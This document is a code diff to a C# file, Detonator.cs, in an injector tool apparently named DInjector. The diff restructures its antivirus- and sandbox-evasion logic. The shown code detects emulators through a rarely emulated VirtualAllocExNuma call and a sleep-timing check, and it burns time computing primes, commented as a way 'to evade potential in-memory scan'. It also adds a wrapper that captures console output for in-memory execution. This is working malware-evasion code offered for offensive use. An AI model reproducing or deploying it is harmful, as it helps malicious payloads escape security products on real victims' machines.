@@ -5,27 +5,46 @@ using System.Linq;
 using System.Diagnostics;
 using System.Globalization;
 using System.Collections.Generic;
-using System.Runtime.InteropServices;
 
 namespace DInjector
 {
     public class Detonator
     {
-        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAllocExNuma(
-            IntPtr hProcess,
-            IntPtr lpAddress,
-            uint dwSize,
-            UInt32 flAllocationType,
-            UInt32 flProtect,
-            UInt32 nndPreferred);
-
-        [DllImport("kernel32.dll")]
-        static extern void Sleep(uint dwMilliseconds);
-
-        static bool isPrime(int number)
+        /// <summary>
+        /// Check if we're in a sandbox by calling a rare-emulated API.
+        /// </summary>
+        static bool UncommonAPICheck()
         {
-            bool calcPrime(int value)
+            if (Win32.VirtualAllocExNuma(Process.GetCurrentProcess().Handle, IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
+                return false;
+
+            return true;
+        }
+
+        /// <summary>
+        /// Check if the emulator did not fast-forward through the sleep instruction.
+        /// </summary>
+        static bool SleepCheck()
+        {
+            var rand = new Random();
+            uint dream = (uint)rand.Next(2000, 3000);
+            double delta = dream / 1000 - 0.5;
+
+            DateTime before = DateTime.Now;
+            Win32.Sleep(dream);
+
+            if (DateTime.Now.Subtract(before).TotalSeconds < delta)
+                return false;
+
+            return true;
+        }
+
+        /// <summary>
+        /// Calculate primes to sleep before execution.
+        /// </summary>
+        static bool IsPrime(int number)
+        {
+            bool CalcPrime(int value)
             {
                 var possibleFactors = Math.Sqrt(number);
 
@@ -36,33 +55,12 @@ namespace DInjector
                 return true;
             }
 
-            return number > 1 && calcPrime(number);
+            return number > 1 && CalcPrime(number);
         }
 
-        public static void Boom(string[] args)
+        static void BoomExecute(Dictionary<string, string> options)
         {
-            // Check if we're in a sandbox by calling a rare-emulated API
-            if (VirtualAllocExNuma(Process.GetCurrentProcess().Handle, IntPtr.Zero, 0x1000, 0x3000, 0x4, 0) == IntPtr.Zero)
-            {
-                Console.WriteLine("(Detonator) [-] Failed VirtualAllocExNuma check");
-                return;
-            }
-
-            // Check if the emulator did not fast-forward through the sleep instruction
-            var rand = new Random();
-            uint dream = (uint)rand.Next(2000, 3000);
-            double delta = dream / 1000 - 0.5;
-            DateTime before = DateTime.Now;
-            Sleep(dream);
-            if (DateTime.Now.Subtract(before).TotalSeconds < delta)
-            {
-                Console.WriteLine("(Detonator) [-] Failed Sleep check");
-                return;
-            }
-
-            var options = ArgumentParser.Parse(args);
-
-            // Sleep to evade in-memory scan
+            // Sleep to evade potential in-memory scan
             try
             {
                 int k = 0, sleep = int.Parse(options["/sleep"]);
@@ -79,8 +77,10 @@ namespace DInjector
                 else if (50 <= sleep && sleep < 60 || 60 <= sleep)
                     k = 1;
 
+                Console.WriteLine("(Detonator) [=] Sleeping a bit...");
+
                 int start = 1, end = sleep * k * 100000;
-                _ = Enumerable.Range(start, end - start).Where(isPrime).Select(number => number).ToList();
+                _ = Enumerable.Range(start, end - start).Where(IsPrime).Select(number => number).ToList();
             }
             catch (Exception)
             { }
@@ -222,6 +222,59 @@ namespace DInjector
                         blockDlls);
                     break;
             }
+        }
+
+        public static string BoomString(string command)
+        {
+            if (!UncommonAPICheck())
+                return "(Detonator) [-] Failed uncommon API check\n";
+
+            if (!SleepCheck())
+                return "(Detonator) [-] Failed sleep check\n";
+
+            var args = command.Split();
+            var options = ArgumentParser.Parse(args);
+
+            // Stolen from Rubeus: https://github.com/GhostPack/Rubeus/blob/493b8c72c32426db95ffcbd355442fdb2791ca25/Rubeus/Program.cs#L75-L93
+            var realStdOut = Console.Out;
+            var realStdErr = Console.Error;
+            var stdOutWriter = new StringWriter();
+            var stdErrWriter = new StringWriter();
+            Console.SetOut(stdOutWriter);
+            Console.SetError(stdErrWriter);
+
+            BoomExecute(options);
+
+            Console.Out.Flush();
+            Console.Error.Flush();
+            Console.SetOut(realStdOut);
+            Console.SetError(realStdErr);
+
+            var output = "";
+            output += stdOutWriter.ToString();
+            output += stdErrWriter.ToString();
+
+            return output;
+        }
+
+        public static void Boom(string command)
+        {
+            if (!UncommonAPICheck())
+            {
+                Console.WriteLine("(Detonator) [-] Failed uncommon API check");
+                return;
+            }
+
+            if (!SleepCheck())
+            {
+                Console.WriteLine("(Detonator) [-] Failed sleep check");
+                return;
+            }
+
+            var args = command.Split();
+            var options = ArgumentParser.Parse(args);
+
+            BoomExecute(options);
         }
     }
 }
